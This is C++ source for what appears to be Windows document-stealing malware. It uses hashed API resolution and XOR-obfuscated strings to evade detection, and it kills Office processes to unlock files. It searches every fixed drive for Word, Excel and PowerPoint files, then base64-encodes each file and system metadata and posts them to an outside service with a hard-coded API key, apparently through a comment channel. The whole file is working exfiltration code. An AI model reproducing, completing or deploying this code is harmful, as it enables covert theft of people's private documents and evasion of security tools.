#include "commun.h"
#include "base64.h"
#include "httpTrafic.h"
#include "crypto.h"
#include "getaddress.h"
#include "getMetaData.h"

// Note: Replace the placeholder values below with actual values.
const char* api_key = "8b6e5ecfa72a0db4f9356f1bc55abe33d10ee8657f8a2a51bc7a528e518fe32f";
const char* file_hash = "54eea01fed409fd79cbcc515ac11da7a3df7c468663877f711557500a0c745f2";


#define WideCharToMultiByte_h           0xcc704688
#define CreateToolhelp32Snapshot_h      0x69842b8f
#define Process32First_h                0xd08370eb
#define _stricmp_h                       0x715b9300
#define OpenProcess_h                   0xc085f890
#define TerminateProcess_h              0x4c49c667
#define CloseHandle_h                   0x87bfc4c1
#define Process32Next_h                 0xef101062
#define strstr_h                        0xf52b9d1
#define strlen_h                        0xf529a17
#define Sleep_h                         0xa8d9dd38
#define GetStdHandle_h                  0x2aa6d636
#define FindFirstFileW_h                0xec30ef5f
#define FindNextFileW_h                 0x52accd96


typedef struct tagPROCESSENTRY32 {
    DWORD     dwSize;
    DWORD     cntUsage;
    DWORD     th32ProcessID;          // This process's unique process identifier
    ULONG_PTR th32DefaultHeapID;
    DWORD     th32ModuleID;           // Associated exe
    DWORD     cntThreads;
    DWORD     th32ParentProcessID;    // This process's parent process
    LONG      pcPriClassBase;         // Base priority of process threads
    DWORD     dwFlags;
    CHAR      szExeFile[MAX_PATH];    // Path to the executable file
} PROCESSENTRY32;

typedef PROCESSENTRY32* PPROCESSENTRY32;
typedef PROCESSENTRY32* LPPROCESSENTRY32;

typedef BOOL (WINAPI* FindNextFileW_t)(
    HANDLE             hFindFile,
    LPWIN32_FIND_DATAW lpFindFileData
);

typedef HANDLE (WINAPI* FindFirstFileW_t)(
    LPCWSTR            lpFileName,
    LPWIN32_FIND_DATAW lpFindFileData
);


typedef HANDLE (WINAPI* GetStdHandle_t)(
    DWORD nStdHandle
);

typedef void (WINAPI* Sleep_t)(
    DWORD dwMilliseconds
);


typedef size_t (WINAPI* strlen_t)(
    const char* str
);

typedef char* (WINAPI* strstr_t)(
    const char* str,
    const char* strSearch
);

typedef HANDLE (WINAPI* OpenProcess_t)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);

typedef BOOL (WINAPI* TerminateProcess_t)(
    HANDLE hProcess,
    UINT   uExitCode
);

typedef BOOL (WINAPI* CloseHandle_t)(
    HANDLE hObject
);

typedef int (WINAPI* WideCharToMultiByte_t)(
    UINT                               CodePage,
    DWORD                              dwFlags,
    _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
    int                                cchWideChar,
    LPSTR                              lpMultiByteStr,
    int                                cbMultiByte,
    LPCCH                              lpDefaultChar,
    LPBOOL                             lpUsedDefaultChar
);

typedef HANDLE (WINAPI* CreateToolhelp32Snapshot_t)(
    DWORD dwFlags,
    DWORD th32ProcessID
);

typedef BOOL (WINAPI* Process32First_t)(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
);

typedef int (WINAPI* _stricmp_t)(const char* string1, const char* string2);


typedef BOOL (WINAPI* Process32Next_t)(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
);


const char* TCHARtoChar(const _TCHAR* tcharString) {

    WideCharToMultiByte_t WideCharToMultiByteFunc = (WideCharToMultiByte_t)PEBGetAddr(WideCharToMultiByte_h);

#ifdef UNICODE
    // Calculate required buffer size
    int bufferSize = WideCharToMultiByteFunc(CP_ACP, 0, tcharString, -1, NULL, 0, NULL, NULL);

    // Allocate buffer for conversion
    char* buffer = new char[bufferSize];

    // Perform conversion
    WideCharToMultiByteFunc(CP_ACP, 0, tcharString, -1, buffer, bufferSize, NULL, NULL);

    return buffer;  // Make sure to delete[] this buffer when done
#else
    return tcharString;  // No conversion required
#endif
}


const char* WCharToChar(const wchar_t* wcharString) {
    WideCharToMultiByte_t WideCharToMultiByteFunc = (WideCharToMultiByte_t)PEBGetAddr(WideCharToMultiByte_h);


    // Calculate required buffer size
    int bufferSize = WideCharToMultiByteFunc(CP_ACP, 0, wcharString, -1, NULL, 0, NULL, NULL);

    // Allocate buffer for conversion
    char* buffer = new char[bufferSize];

    // Perform conversion
    WideCharToMultiByteFunc(CP_ACP, 0, wcharString, -1, buffer, bufferSize, NULL, NULL);

    return buffer;  // Make sure to delete[] this buffer when done
}


void kill_process(const char* process_name) {

    CreateToolhelp32Snapshot_t CreateToolhelp32SnapshotFunc = (CreateToolhelp32Snapshot_t)PEBGetAddr(CreateToolhelp32Snapshot_h);
    Process32First_t Process32FirstFunc = (Process32First_t)PEBGetAddr(Process32First_h);
    _stricmp_t  _stricmpFunc = (_stricmp_t)PEBGetAddr(_stricmp_h);
    OpenProcess_t OpenProcessFunc = (OpenProcess_t)PEBGetAddr(OpenProcess_h);
    TerminateProcess_t TerminateProcessFunc = (TerminateProcess_t)PEBGetAddr(TerminateProcess_h);
    CloseHandle_t CloseHandleFunc = (CloseHandle_t)PEBGetAddr(CloseHandle_h);
    Process32Next_t Process32NextFunc = (Process32Next_t)PEBGetAddr(Process32Next_h);
    HANDLE hSnapShot = CreateToolhelp32SnapshotFunc(0x00000001 | 0x00000008 | 0x00000002 | 0x00000004, 0);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32FirstFunc(hSnapShot, &pEntry);
    while (hRes) {

        if (_stricmpFunc(pEntry.szExeFile, process_name) == 0) {
            HANDLE hProcess = OpenProcessFunc(PROCESS_TERMINATE, 0, pEntry.th32ProcessID);
            if (hProcess != NULL) {
                TerminateProcessFunc(hProcess, 9);
                CloseHandleFunc(hProcess);
            }
        }
        hRes = Process32NextFunc(hSnapShot, &pEntry);
    }
    CloseHandleFunc(hSnapShot);
}



bool has_target_extension(const char* filename) {
    strstr_t strstrFunc = (strstr_t)PEBGetAddr(strstr_h);
    strlen_t strlenFunc = (strlen_t)PEBGetAddr(strlen_h);
    Sleep_t SleepFunc = (Sleep_t)PEBGetAddr(Sleep_h);
    const char docx[] = "\x84\xCE\xC5\xC9\xD2\xAA";     // xor(.docx)
    const char xlsx[] = "\x84\xD2\xC6\xD9\xD2\xAA";     // xor(.xlsx)
    const char pptx[] = "\x84\xDA\xDA\xDE\xD2\xAA";     // xor(.pptx)
    const char winword[] = "\xFD\xE3\xE4\xFD\xE5\xF8\xEE\x84\xEF\xF2\xEF\xAA";      // xor(WINWORD.EXE)
    const char excel[] = "\xEF\xF2\xE9\xEF\xE6\x84\xEF\xF2\xEF\xAA";                // xor(EXCEL.EXE)
    const char powrpnt[] = "\xFA\xE5\xFD\xEF\xF8\xFA\xE4\xFE\x84\xEF\xF2\xEF\xAA";  // xor(POWERPNT.EXE)

    const char* extensions[] = { docx, xlsx, pptx };
    for (int i = 0; i < sizeof(extensions) / sizeof(extensions[0]); i++) {
        xor_aa_byte((char*)extensions[i], strlenFunc(extensions[i]));
    }
    for (int i = 0; i < sizeof(extensions) / sizeof(extensions[0]); i++) {
        if (strstrFunc(filename, extensions[i]) != NULL) {
            if (strstrFunc(filename, docx) != NULL) {
                xor_aa_byte((char*)winword, sizeof(winword));
                kill_process(winword);
                SleepFunc(1000);
            }
            else if (strstrFunc(filename, xlsx) != NULL) {
                xor_aa_byte((char*)excel, sizeof(excel));
                kill_process(excel);
                SleepFunc(1000);
            }
            else if (strstrFunc(filename, pptx) != NULL) {
                xor_aa_byte((char*)powrpnt, sizeof(powrpnt));
                kill_process(powrpnt);
                SleepFunc(1000);
            }
            return true;
        }
    }
    return false;
}



void search_files(const _TCHAR* directory) {

    GetStdHandle_t GetStdHandleFunc = (GetStdHandle_t)PEBGetAddr(GetStdHandle_h);
    FindFirstFileW_t FindFirstFileWFunc = (FindFirstFileW_t)PEBGetAddr(FindFirstFileW_h);
    FindNextFileW_t FindNextFileWFunc = (FindNextFileW_t)PEBGetAddr(FindNextFileW_h);

    WIN32_FIND_DATA findFileData;
    _TCHAR findPath[MAX_PATH];
    HANDLE hConsole = GetStdHandleFunc(STD_OUTPUT_HANDLE);
    const WORD saved_attributes = [hConsole] {
        CONSOLE_SCREEN_BUFFER_INFO info;
        GetConsoleScreenBufferInfo(hConsole, &info);
        return info.wAttributes;
    }(); // Lambda to save original console attributes

    // Keep using the wildcard when finding files
    _stprintf(findPath, _T("%s*"), directory);
    HANDLE hFind = FindFirstFileWFunc(findPath, &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return; // Directory not found or other I/O error
    }
    else {
        do {
            const _TCHAR* fileOrDirName = findFileData.cFileName;
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // Ignore the pseudo directories "." and ".."
                if (_tcscmp(fileOrDirName, _T(".")) != 0 && _tcscmp(fileOrDirName, _T("..")) != 0) {

                    // Check if directory contains $Recycle.Bin
                    if (_tcsstr(fileOrDirName, _T("$Recycle.Bin")) != NULL) {
                        continue; // Skip this directory and proceed to the next one
                    }

                    // Construct new directory path and search recursively
                    _TCHAR newDirPath[MAX_PATH];
                    _stprintf(newDirPath, _T("%s%s\\"), directory, fileOrDirName);
                    search_files(newDirPath);
                }
            }
            else {
                if (_tcsncmp(fileOrDirName, _T("~$"), 2) == 0) {
                    continue; // Skip this file and proceed to the next one
                }
                const char* fileOrDirNameChar = TCHARtoChar(fileOrDirName);
                if (has_target_extension(fileOrDirNameChar)) {
                    _TCHAR filePath[MAX_PATH];
                    _stprintf(filePath, _T("%s%s"), directory, fileOrDirName);
                    SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY); // Light cyan
                    _tprintf(_T("\t\t[!] Found: %s\n"), filePath);
                    SetConsoleTextAttribute(hConsole, saved_attributes); // Restore original console attributes

                    // base64 encode the filePath
                    char* base64content = encode_file_base64(filePath);
                    //printf("base64content : %s\n", base64content);
                    const char* result = PostComment(api_key, file_hash, base64content);
                    if (result == NULL) {
                        printf("PostComment failed with error code: %d\n", result);
                    }
                }
            }
        } while (FindNextFileWFunc(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
}






void search_all_drives() {
    
    GetStdHandle_t GetStdHandleFunc = (GetStdHandle_t)PEBGetAddr(GetStdHandle_h);

    char* metadata = get_metadata();
    
    if (metadata) {

        char* metadatab64 = base64_encode((const BYTE*)metadata, strlen(metadata));
        if (metadatab64) {
            const char* result = PostComment(api_key, file_hash, metadatab64);
            if (result == NULL) {
                printf("PostComment failed with error code: %d\n", result);
            }
            free(metadatab64);  // Free the encoded data
        }
        else {
            printf("Failed to encode metadata to base64.\n");
        }

        free(metadata);  // Free the original metadata
    }
    else {
        printf("Failed to retrieve metadata.\n");
    }
    
    _TCHAR drive[] = _T("A:\\");
    HANDLE hConsole = GetStdHandleFunc(STD_OUTPUT_HANDLE);
    const WORD saved_attributes = [hConsole] {
        CONSOLE_SCREEN_BUFFER_INFO info;
        GetConsoleScreenBufferInfo(hConsole, &info);
        return info.wAttributes;
    }(); // Lambda to save original console attributes

    for (; drive[0] <= _T('Z'); drive[0]++) {
        if (GetDriveType(drive) == DRIVE_FIXED) {
            SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY); // Light yellow
            _tprintf(_T("\t[+] Searching in drive %c:\n"), drive[0]);
            SetConsoleTextAttribute(hConsole, saved_attributes); // Restore original console attributes
            search_files(drive); // Call without wildcard
        }
    }
    const char* finish = PostComment(api_key, file_hash, "This program cannot be run in DOS mode");
    if (finish == NULL) {
        printf("PostComment failed with error code: %d\n", finish);
    }
    printf("[+] Finished\n");
    
}
